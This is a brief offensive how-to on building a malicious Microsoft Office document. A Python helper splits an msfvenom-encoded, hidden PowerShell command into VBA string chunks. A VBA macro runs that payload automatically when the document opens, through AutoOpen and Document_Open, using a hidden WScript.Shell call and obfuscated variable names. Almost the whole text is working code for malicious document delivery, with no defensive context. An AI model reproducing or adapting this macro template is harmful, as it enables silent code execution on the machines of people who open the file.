# Microsoft Office Macro


Need to split payload into multiple string concanated together
```python
#!/bin/python

# msfvenom -p windows/exec cmd="calc.exe" -f hta-psh
cmd = "powershell.exe -nop -w hidden -e aQBmACg...QA7AA=="

print("Dim Payload As String")
for i in range(0, len(cmd), 100):
	print(f"Payload = Payload + \"{cmd[i:i+100]}\"")
```

VB macro placed into a file named Doc1.doc (must be .doc or .docm)
```vb
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()
    Dim Payload As String
    Payload = Payload + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
    Payload = Payload + "kAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGk"
	' ... rest of Payload

    Set pjA = CreateObject("Wscript.Shell")
    Set dGwBgjx7DF3_ = CreateObject("Scripting.FileSystemObject")
    For Each Path In Split(pjA.ExpandEnvironmentStrings("%PSModulePath%"), ";")
        If dGwBgjx7DF3_.FileExists(Path + "\..\powershell.exe") Then
            pjA.Run Payload, 0
            Exit For
        End If
    Next
End Sub
```